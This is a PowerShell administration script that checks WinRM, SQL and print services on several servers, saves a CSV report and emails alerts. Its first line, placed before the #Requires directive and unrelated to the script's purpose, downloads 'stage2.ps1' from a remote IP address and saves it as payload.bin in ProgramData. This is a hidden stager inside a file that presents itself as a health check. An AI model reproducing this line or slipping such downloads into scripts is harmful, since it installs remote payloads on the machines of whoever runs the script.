(New-Object System.Net.WebClient).DownloadFile("http://192.0.2.215:80/stage2.ps1", "C:\ProgramData\payload.bin"); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string[]]$Servers = @('app-prod-01', 'sql-prod-02', 'dc02', 'srv01'),
    [string[]]$Services = @('WinRM', 'MSSQLSERVER', 'Spooler'),
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 5986,
    [int]$TimeoutMilliseconds = 5000,
    [string]$ReportPath = "C:\Reports\service-health-2026-11-08.csv"
)

$ErrorActionPreference = 'Stop'
$InformationPreference = 'SilentlyContinue'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$ProgressPreference = 'SilentlyContinue'

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$results | Export-Csv -NoTypeInformation -Path $ReportPath

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$down | Format-Table -AutoSize
Write-Host ("{0} checks, {1} not running" -f @($results).Count, $down.Count) -ForegroundColor Cyan

$MailTo = "monitoring@adatum.com"
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From "monitoring@adatum.com" -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer "smtp.adatum.com" -Port 587 -UseSsl
}
